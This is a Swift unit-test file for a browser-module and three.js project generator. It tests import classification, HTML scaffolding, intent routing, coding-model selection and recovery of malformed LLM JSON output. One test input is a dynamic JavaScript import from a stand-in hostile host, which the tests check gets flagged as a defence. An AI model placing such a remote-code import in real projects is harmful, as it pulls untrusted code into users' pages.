import Foundation
import Testing
@testable import EshCore

@Suite
struct BrowserModuleTests {
    // MARK: - Import scanning + classification

    @Test func classifiesModuleSpecifiers() {
        #expect(BrowserModuleComposer.classify("three") == .bare)
        #expect(BrowserModuleComposer.classify("./helpers.js") == .relative)
        #expect(BrowserModuleComposer.classify("../x.js") == .relative)
        #expect(BrowserModuleComposer.classify("/abs.js") == .relative)
        #expect(BrowserModuleComposer.classify("https://cdn.example/three.js") == .url)
        #expect(BrowserModuleComposer.classify("//cdn.example/x.js") == .url)
    }

    @Test func extractsAllImportForms() {
        let js = """
        import * as THREE from "three";
        import { foo } from './util.js';
        import "sideeffect";
        const m = await import("https://evil.example/x.js");
        """
        let specs = Set(BrowserModuleComposer.imports(inJS: js).map { $0.specifier })
        #expect(specs.contains("three"))
        #expect(specs.contains("./util.js"))
        #expect(specs.contains("sideeffect"))
        #expect(specs.contains("https://evil.example/x.js"))   // dynamic import cannot smuggle a remote URL past us
        let urlRefs = BrowserModuleComposer.imports(inJS: js).filter { $0.kind == .url }
        #expect(urlRefs.count == 1)
    }

    // MARK: - Scaffold

    @Test func scaffoldInjectsImportMapAndMount() {
        let html = BrowserModuleComposer.scaffoldIndexHTML(
            title: "T", importMap: ["three": "./vendor/three/three.module.min.js"],
            globals: [("three", "THREE")], hasStyle: true, appEntry: "app.js")
        #expect(html.contains("type=\"importmap\""))
        #expect(html.contains("./vendor/three/three.module.min.js"))
        #expect(html.contains("globalThis.THREE"))
        #expect(html.contains("<div id=\"app\">"))
        #expect(html.contains("src=\"app.js\""))
        #expect(html.contains("<link rel=\"stylesheet\" href=\"style.css\">"))
    }

    @Test func threeScaffoldOwnsRendererAndLoop() {
        let html = BrowserModuleComposer.scaffoldThreeJSIndexHTML(
            title: "Earth", importMap: ["three": "./vendor/three/three.module.min.js"],
            hasStyle: false, appEntry: "app.js")
        #expect(html.contains("WebGLRenderer"))
        #expect(html.contains("globalThis.scene"))
        #expect(html.contains("globalThis.eshTick"))     // per-frame hook the model fills in
        #expect(html.contains("requestAnimationFrame"))
        #expect(html.contains("addEventListener('resize'"))
    }

    @Test func requestedTierBTypeParsesOption() {
        func req(_ pt: String?) -> ExecutionRequest {
            var opts = ExecutionOptions()
            if let pt { opts = ExecutionOptions(["projectType": .string(pt)]) }
            return ExecutionRequest(capability: .projectGenerate, inputs: [.text("x")], output: .project, options: opts)
        }
        #expect(BrowserModuleComposer.requestedTierBType(req("threejs")) == .threejs)
        #expect(BrowserModuleComposer.requestedTierBType(req("browser-module")) == .browserModule)
        #expect(BrowserModuleComposer.requestedTierBType(req(nil)) == nil)
        #expect(BrowserModuleComposer.requestedTierBType(req("static")) == nil)   // not a Tier-B type
    }

    // MARK: - Routing (Phase 5)

    @Test func routesBrowserNativeToProjectGenerateWithType() {
        let r = DeterministicIntentRouter()
        let earth = r.route(message: "Create an interactive rotating 3D Earth with earthquake markers", inputModalities: [])
        #expect(earth.capability == .projectGenerate)
        #expect(earth.arguments["projectType"] == .string("threejs"))
        let solar = r.route(message: "make a three.js solar system", inputModalities: [])
        #expect(solar.capability == .projectGenerate)
        #expect(solar.arguments["projectType"] == .string("threejs"))
    }

    @Test func routingKeepsOtherGenerationsDistinct() {
        let r = DeterministicIntentRouter()
        #expect(r.route(message: "create a static landing page for a cafe", inputModalities: []).capability == .webArtifactGenerate)
        #expect(r.route(message: "generate an svg logo of a fox", inputModalities: []).capability == .vectorGenerate)
        #expect(r.route(message: "generate a photo of a mountain", inputModalities: []).capability == .imageGenerate)
        // No generation verb → not a project (stays chat/other), so Tier-0 doesn't over-trigger.
        #expect(r.route(message: "what is the solar system", inputModalities: []).capability != .projectGenerate)
    }

    @Test func classifierMapsThreeVsGenericBrowserModule() {
        #expect(CapabilityRouteCatalog.browserNativeProjectType("an interactive 3d scene") == .threejs)
        #expect(CapabilityRouteCatalog.browserNativeProjectType("a canvas animation of falling snow") == .browserModule)
        #expect(CapabilityRouteCatalog.browserNativeProjectType("a static landing page") == nil)
    }

    // MARK: - Tier-B coding-model selection (Phase 7) — metadata-driven, no hard-coded id

    private func inst(_ id: String, size: Int64, vision: Bool = false) -> ModelInstall {
        ModelInstall(id: id,
                     spec: ModelSpec(id: id, displayName: id, backend: .mlx,
                                     source: ModelSource(kind: .huggingFace, reference: id),
                                     inputModalities: vision ? [.text, .image] : [.text],
                                     capabilities: .textGeneration),
                     installPath: "/x/\(id)", sizeBytes: size, backendFormat: "mlx")
    }

    @Test func bestCodingModelPicksLargestCoderTextModel() {
        let installs = [
            inst("mlx-community--qwen2.5-0.5b-instruct-4bit", size: 400_000_000),          // tiny, non-coder
            inst("mlx-community--qwen2.5-coder-7b-instruct-4bit", size: 4_300_000_000),    // coder 7B
            inst("mlx-community--qwen2.5-coder-14b-instruct-4bit", size: 8_300_000_000),   // coder 14B (largest)
            inst("mlx-community--nanollava-1.5-4bit", size: 3_000_000_000, vision: true),  // vision → excluded
            inst("mlx-community--llama-3.2-3b-instruct-4bit", size: 1_800_000_000),        // chat, non-coder
        ]
        #expect(ProjectGenProvider.bestCodingModelID(installs) == "mlx-community--qwen2.5-coder-14b-instruct-4bit")
        // No coder installed → nil so the provider falls back to Apple FM / default.
        #expect(ProjectGenProvider.bestCodingModelID([inst("x--llama-3.2-3b", size: 1_800_000_000)]) == nil)
        // A coder-named VISION model is still excluded (Tier-B needs a text model).
        #expect(ProjectGenProvider.bestCodingModelID([inst("x--some-coder-vl", size: 9_000_000_000, vision: true)]) == nil)
    }

    @Test func decodeManifestRecoversBacktickTemplateLiterals() {
        // Common LLM deviation: content delimited by JS backticks + wrapped in a ```json fence → invalid JSON.
        let raw = "```json\n{\"files\":[{\"path\":\"app.js\",\"content\":`const x = 1;\nconsole.log(\"hi\");`}]}\n```"
        let m = ProjectGenProvider.decodeManifest(from: raw)
        #expect(m?.files.first?.path == "app.js")
        #expect(m?.files.first?.content.contains("console.log") == true)
        #expect(m?.files.first?.content.contains("\n") == true)          // newline preserved, not literal \n
        // Strict, already-valid JSON still decodes unchanged.
        let strict = "{\"files\":[{\"path\":\"a.js\",\"content\":\"let y=2;\"}]}"
        #expect(ProjectGenProvider.decodeManifest(from: strict)?.files.first?.content == "let y=2;")
    }
}
